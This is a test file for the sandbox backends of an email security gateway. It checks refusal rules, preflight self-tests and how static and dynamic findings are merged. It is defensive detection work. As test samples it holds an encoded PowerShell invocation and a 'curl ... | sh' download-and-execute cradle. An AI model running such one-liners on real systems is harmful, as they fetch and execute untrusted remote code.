import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createLogger } from '@email-gateway/logger';
import {
  emptySandboxObservations,
  sandboxObservationsSchema,
  type SandboxObservations,
} from '@email-gateway/security-contracts';
import { afterAll, describe, expect, it } from 'vitest';
import { describeBackendConformance } from '../../integration/support/backend-conformance';
import { ScratchArea } from '../scratch/scratch';
import { type BackendObservation, BackendRefusedError, type SandboxBackend } from './backend';
import { mergeFindings, mergeObservations, withLimits, withStaticAnalysis } from './composite';
import { DisabledBackend } from './disabled.backend';
import { FakeDocker } from '../runner/fake-docker.test-support';
import { createBackend, refusesStartOnFailedSelfTest, type FactoryConfig } from './factory';
import { compiledAnalyzerChild } from './static/child.test-support';
import { AnalyzerChildRunner } from './static/child-runner';
import { StaticBackend } from './static/static.backend';
import type { KubernetesClient, KubernetesResponse } from './vm/k8s-client';
import { VmBackend } from './vm/vm.backend';

const logger = createLogger({ service: 'backends-test', level: 'silent' });

const roots: string[] = [];
afterAll(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

function scratchRoot(): string {
  const root = mkdtempSync(join(tmpdir(), 'eg-sbx-conf-'));
  roots.push(root);
  return root;
}

function fakeKubernetes(options: {
  inCluster: boolean;
  response?: KubernetesResponse | Error;
}): KubernetesClient & { paths: string[] } {
  const paths: string[] = [];
  return {
    paths,
    inCluster: () => Promise.resolve(options.inCluster),
    get: (path) => {
      paths.push(path);
      if (options.response instanceof Error) return Promise.reject(options.response);
      return Promise.resolve(options.response ?? { status: 404, body: null });
    },
  };
}

function vm(client: KubernetesClient): VmBackend {
  return new VmBackend({
    client,
    runtimeClass: 'gvisor',
    allowedHandlers: ['runsc', 'kata-fc'],
    namespace: 'email-gateway-sandbox-runners',
  });
}

async function staticBackend(root: string): Promise<StaticBackend> {
  const scratch = new ScratchArea(root);
  await scratch.init();
  const runner = new AnalyzerChildRunner({
    entry: compiledAnalyzerChild(),
    heapMb: 128,
    maxRssMb: 512,
    cpuSeconds: 10,
    timeoutMs: 20_000,
    prlimitPath: null,
  });
  return new StaticBackend({ runner, scratch, logger });
}

describeBackendConformance({
  label: 'disabled',
  create: () => Promise.resolve({ backend: new DisabledBackend(), scratchRoot: scratchRoot() }),
  sample: { bytes: Buffer.from('x'), detectedType: 'script_shell' },
  expect: { name: 'disabled', executes: false, selfTestOk: true },
});

describeBackendConformance({
  label: 'static (real analyzer child)',
  create: async () => {
    const root = scratchRoot();
    return { backend: withStaticAnalysis(await staticBackend(root), null), scratchRoot: root };
  },
  sample: {
    bytes: Buffer.from('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'),
    detectedType: 'script_ps1',
  },
  expect: { name: 'static', executes: false, selfTestOk: true },
});

describeBackendConformance({
  label: 'vm (fake Kubernetes client, every proof passing)',
  create: () =>
    Promise.resolve({
      backend: vm(
        fakeKubernetes({ inCluster: true, response: { status: 200, body: { handler: 'runsc' } } }),
      ),
      scratchRoot: scratchRoot(),
    }),
  sample: { bytes: Buffer.from('x'), detectedType: 'pe_executable', profile: 'execute' },
  expect: {
    name: 'vm',
    executes: true,
    selfTestOk: false,
    selfTestCode: 'vm_runner_not_implemented',
    runRefusal: 'vm_runner_not_implemented',
  },
});

describe('disabled backend', () => {
  it('answers not_executed/backend_disabled without reading anything', async () => {
    const backend = new DisabledBackend();
    expect(backend.supports()).toEqual({ ok: false, reason: 'backend_disabled' });
    const obs = await backend.run({} as never);
    expect(obs).toMatchObject({
      status: 'not_executed',
      notExecutedReason: 'backend_disabled',
      executed: false,
      artifacts: [],
    });
    expect(await backend.selfTest()).toEqual({
      ok: true,
      code: 'ok',
      details: { execution: false },
    });
  });
});

describe('vm backend preflight (X9)', () => {
  const cases: [string, Parameters<typeof fakeKubernetes>[0], string][] = [
    ['not in Kubernetes', { inCluster: false }, 'not_in_kubernetes'],
    [
      'RuntimeClass missing',
      { inCluster: true, response: { status: 404, body: null } },
      'runtime_class_missing',
    ],
    [
      'RBAC denied (403)',
      { inCluster: true, response: { status: 403, body: null } },
      'rbac_denied',
    ],
    [
      'RBAC denied (401)',
      { inCluster: true, response: { status: 401, body: null } },
      'rbac_denied',
    ],
    [
      'API unreachable',
      { inCluster: true, response: new Error('ECONNREFUSED') },
      'preflight_failed',
    ],
    [
      'handler not allowed',
      { inCluster: true, response: { status: 200, body: { handler: 'runc' } } },
      'handler_not_allowed',
    ],
    [
      'handler malformed',
      { inCluster: true, response: { status: 200, body: { handler: 'Run C;' } } },
      'handler_not_allowed',
    ],
    [
      'every proof passes',
      { inCluster: true, response: { status: 200, body: { handler: 'kata-fc' } } },
      'vm_runner_not_implemented',
    ],
  ];
  it.each(cases)('%s → %s', async (_label, options, code) => {
    const client = fakeKubernetes(options);
    const result = await vm(client).selfTest(AbortSignal.timeout(1000));
    expect(result.ok).toBe(false);
    expect(result.code).toBe(code);
    if (options.inCluster)
      expect(client.paths).toEqual(['/apis/node.k8s.io/v1/runtimeclasses/gvisor']);
    else expect(client.paths).toEqual([]);
  });

  it('never supports a task and refuses to run', async () => {
    const backend = vm(fakeKubernetes({ inCluster: false }));
    expect(backend.supports()).toEqual({ ok: false, reason: 'profile_not_supported' });
    await expect(backend.run()).rejects.toEqual(
      new BackendRefusedError('vm_runner_not_implemented'),
    );
    expect(refusesStartOnFailedSelfTest(backend)).toBe(true);
    expect(refusesStartOnFailedSelfTest(new DisabledBackend())).toBe(false);
  });
});

describe('factory', () => {
  const config: FactoryConfig = {
    SANDBOX_BACKEND: 'disabled',
    SANDBOX_STATIC_HEAP_MB: 128,
    SANDBOX_STATIC_MAX_RSS_MB: 256,
    SANDBOX_STATIC_CPU_SECONDS: 5,
    SANDBOX_STATIC_TIMEOUT_MS: 5000,
    SANDBOX_VM_RUNTIME_CLASS: 'gvisor',
    SANDBOX_VM_ALLOWED_HANDLERS: ['runsc'],
    SANDBOX_VM_NAMESPACE: 'ns',
    KUBERNETES_SERVICE_HOST: undefined,
    KUBERNETES_SERVICE_PORT: undefined,
    APP_ENV: 'local',
    SANDBOX_ALLOW_NON_VM_EXECUTION: false,
    SANDBOX_CONTROLLER_NAME: 'sandbox-controller-test',
    SANDBOX_DOCKER_SOCKET: '/var/run/docker.sock',
    SANDBOX_RUNNER_IMAGE: 'email-gateway/sandbox-runner:local',
    SANDBOX_BROWSER_IMAGE: 'email-gateway/url-browser-worker:local',
    SANDBOX_RUNNER_NETWORK: 'email-gateway_sandbox-detonation',
    SANDBOX_SINKHOLE_DNS: '172.31.253.53',
    SANDBOX_SINKHOLE_ADMIN_URL: 'http://172.31.252.53:3094',
    SANDBOX_SINKHOLE_ADMIN_TOKEN: undefined,
  };
  const deps = () => ({ scratch: new ScratchArea(scratchRoot()), logger });
  const hardened: FactoryConfig = {
    ...config,
    SANDBOX_BACKEND: 'hardened-container',
    SANDBOX_ALLOW_NON_VM_EXECUTION: true,
    SANDBOX_SINKHOLE_ADMIN_TOKEN: 't'.repeat(40),
  };

  it('builds disabled, static and vm', () => {
    expect(createBackend(config, deps()).name).toBe('disabled');
    const s = createBackend(
      { ...config, SANDBOX_BACKEND: 'static' },
      { ...deps(), analyzerChildEntry: compiledAnalyzerChild() },
    );
    expect(s).toBeInstanceOf(StaticBackend);
    expect(createBackend({ ...config, SANDBOX_BACKEND: 'vm' }, deps())).toBeInstanceOf(VmBackend);
  });

  it('builds hardened-container as static analysis first, then the runner (NOT a VM boundary)', async () => {
    const docker = new FakeDocker();
    const backend = createBackend(hardened, {
      ...deps(),
      analyzerChildEntry: compiledAnalyzerChild(),
      docker,
    });
    expect(backend.name).toBe('hardened-container');
    expect(backend.isolation).toBe('container');
    expect(backend.executes).toBe(true);
    expect(refusesStartOnFailedSelfTest(backend)).toBe(true);
    // The runner's version (image id) is resolved by its self-test; the composite reads through.
    expect(backend.version).toBe('hardened-container/1+runner:unresolved');
    // Static analysis covers types the runner does not execute; the runner adds script/html.
    const sample = (detectedType: string) => ({
      bytes: Buffer.from('x'),
      sha256: '0'.repeat(64),
      sizeBytes: 1,
      detectedType,
    });
    expect(backend.supports({ profile: 'static', sample: sample('pdf') })).toEqual({ ok: true });
    expect(backend.supports({ profile: 'execute', sample: sample('script_shell') })).toEqual({
      ok: true,
    });
    expect(backend.supports({ profile: 'static', sample: sample('zip') })).toEqual({
      ok: false,
      reason: 'type_not_supported',
    });
    await backend.close();
    expect(docker.calls).not.toContain('create');
  });

  it('re-checks every hardened-container refusal (defence in depth after the config)', () => {
    const build = (patch: Partial<FactoryConfig>) => () =>
      createBackend({ ...hardened, ...patch }, { ...deps(), docker: new FakeDocker() });
    expect(build({ APP_ENV: 'production' })).toThrow(
      new BackendRefusedError('execution_not_allowed_in_environment'),
    );
    expect(build({ APP_ENV: 'staging' })).toThrow(
      new BackendRefusedError('execution_not_allowed_in_environment'),
    );
    expect(build({ KUBERNETES_SERVICE_HOST: '10.0.0.1' })).toThrow(
      new BackendRefusedError('execution_refused_in_kubernetes'),
    );
    expect(build({ SANDBOX_ALLOW_NON_VM_EXECUTION: false })).toThrow(
      new BackendRefusedError('non_vm_execution_not_opted_in'),
    );
    expect(build({ SANDBOX_SINKHOLE_ADMIN_TOKEN: undefined })).toThrow(
      new BackendRefusedError('sinkhole_token_missing'),
    );
  });

  it('refuses a missing analyzer child', () => {
    expect(() =>
      createBackend(
        { ...config, SANDBOX_BACKEND: 'static' },
        { ...deps(), analyzerChildEntry: '/nonexistent/analyzer-child.js' },
      ),
    ).toThrow(new BackendRefusedError('analyzer_child_missing'));
    expect(() =>
      createBackend(hardened, {
        ...deps(),
        analyzerChildEntry: '/nonexistent/analyzer-child.js',
        docker: new FakeDocker(),
      }),
    ).toThrow(new BackendRefusedError('analyzer_child_missing'));
  });

  it('refuses the in-cluster vm preflight on this host (no service account)', async () => {
    const backend = createBackend(
      { ...config, SANDBOX_BACKEND: 'vm', KUBERNETES_SERVICE_HOST: undefined },
      deps(),
    );
    expect((await backend.selfTest(AbortSignal.timeout(1000))).code).toBe('not_in_kubernetes');
  });
});

describe('composite (static first)', () => {
  const obs = (patch: Partial<SandboxObservations>): SandboxObservations => ({
    ...emptySandboxObservations(),
    ...patch,
  });

  it('merges findings by code with fixed severities, highest first, capped', () => {
    const merged = mergeFindings(
      [{ code: 'static.embedded_urls', severity: 'info', count: 2 }],
      [
        { code: 'static.embedded_urls', severity: 'info', count: 3 },
        { code: 'behaviour.metadata_access', severity: 'critical', count: 1 },
      ],
    );
    expect(merged).toEqual([
      { code: 'behaviour.metadata_access', severity: 'critical', count: 1 },
      { code: 'static.embedded_urls', severity: 'info', count: 5 },
    ]);
  });

  it('re-applies every bound after merging two maximal observations', () => {
    const dns = (prefix: string) =>
      Array.from({ length: 50 }, (_, i) => ({
        name: `${prefix}${String(i)}.example.test`,
        type: 'other' as const,
        source: 'static' as const,
      }));
    const a = obs({
      network: {
        ...emptySandboxObservations().network,
        dns: dns('a'),
        totals: { dns: 900_000, http: 0, tls: 0, connections: 0 },
      },
      limitsHit: ['cpu', 'memory'],
    });
    const b = obs({
      network: {
        ...emptySandboxObservations().network,
        dns: dns('b'),
        totals: { dns: 900_000, http: 0, tls: 0, connections: 0 },
      },
      limitsHit: ['memory', 'pids'],
    });
    const merged = mergeObservations(a, b);
    expect(merged.network.dns).toHaveLength(50);
    expect(merged.network.totals.dns).toBe(1_000_000);
    expect(merged.limitsHit).toEqual(['cpu', 'memory', 'pids']);
    expect(sandboxObservationsSchema.safeParse(merged).success).toBe(true);
  });

  it('adds limits with their findings once', () => {
    const o = withLimits(withLimits(emptySandboxObservations(), ['artifact_cap']), [
      'artifact_cap',
      'output_truncated',
    ]);
    expect(o.limitsHit).toEqual(['artifact_cap', 'output_truncated']);
    expect(o.findings.map((f) => f.code).sort()).toEqual([
      'limit.artifact_cap',
      'limit.output_truncated',
    ]);
  });

  it('runs static analysis before an executor and merges both observations', async () => {
    const root = scratchRoot();
    const s = await staticBackend(root);
    const calls: string[] = [];
    const executor: SandboxBackend = {
      name: 'hardened-container',
      isolation: 'container',
      version: 'hardened-container/1+runner:test',
      executes: true,
      selfTest: () => Promise.resolve({ ok: true, code: 'ok', details: { apparmor: false } }),
      supports: (task) =>
        task.sample.detectedType === 'script_shell'
          ? { ok: true }
          : { ok: false, reason: 'type_not_supported' },
      run: (): Promise<BackendObservation> => {
        calls.push('executor');
        return Promise.resolve({
          status: 'completed',
          executed: true,
          notExecutedReason: null,
          errorCode: null,
          observations: obs({
            processes: [
              {
                seq: 0,
                parentSeq: null,
                image: 'sh',
                argvSha256: null,
                exitCode: 0,
                killedBy: null,
              },
            ],
            processCount: 1,
            findings: [{ code: 'behaviour.process_spawn', severity: 'info', count: 1 }],
          }),
          artifacts: [
            { kind: 'process_log', contentType: 'text/plain', bytes: Buffer.from('trace') },
          ],
          analyzerVersion: null,
          cleanup: { runnerRemoved: true, scratchRemoved: true },
        });
      },
      reap: () => Promise.resolve({ runnersRemoved: 1, scratchRemoved: 0, failures: 0 }),
      close: () => Promise.resolve(),
    };
    const composite = withStaticAnalysis(s, executor);
    expect(composite).toMatchObject({
      name: 'hardened-container',
      isolation: 'container',
      executes: true,
    });
    const scratch = new ScratchArea(root);
    const run = async (detectedType: string, bytes: Buffer) =>
      composite.run(
        {
          taskId: '01890a5d-ac96-774b-bcce-b302099a8070',
          analysisId: '1',
          organizationId: '1',
          profile: 'execute',
          sample: { bytes, sha256: '0'.repeat(64), sizeBytes: bytes.length, detectedType },
          limits: {
            wallTimeoutMs: 10_000,
            memoryMb: 128,
            cpuMillis: 500,
            pids: 32,
            scratchMb: 16,
            maxArtifacts: 16,
            maxArtifactBytes: 1024,
            maxTotalArtifactBytes: 4096,
          },
          deadlineAt: new Date(Date.now() + 60_000),
        },
        {
          signal: AbortSignal.timeout(30_000),
          scratchDir: await scratch.create('01890a5d-ac96-774b-bcce-b302099a8070'),
          logger,
          now: () => new Date(),
        },
      );
    const merged = await run('script_shell', Buffer.from('curl http://x.example.test/a | sh'));
    expect(calls).toEqual(['executor']);
    expect(merged.executed).toBe(true);
    expect(merged.observations.findings.map((f) => f.code)).toEqual(
      expect.arrayContaining(['static.script_download_cradle', 'behaviour.process_spawn']),
    );
    expect(merged.artifacts.map((a) => a.kind)).toEqual(['static_report', 'process_log']);
    expect(merged.analyzerVersion).toBe('sandbox-static/1');
    const staticOnly = await run('pdf', Buffer.from('%PDF-1.7\n/JS (x)\n'));
    expect(calls).toEqual(['executor']);
    expect(staticOnly).toMatchObject({ status: 'completed', executed: false });
    expect(await composite.reap(new Set(), 'startup')).toEqual({
      runnersRemoved: 1,
      scratchRemoved: 0,
      failures: 0,
    });
    expect((await composite.selfTest(AbortSignal.timeout(30_000))).ok).toBe(true);
    await composite.close();
  }, 60_000);
});
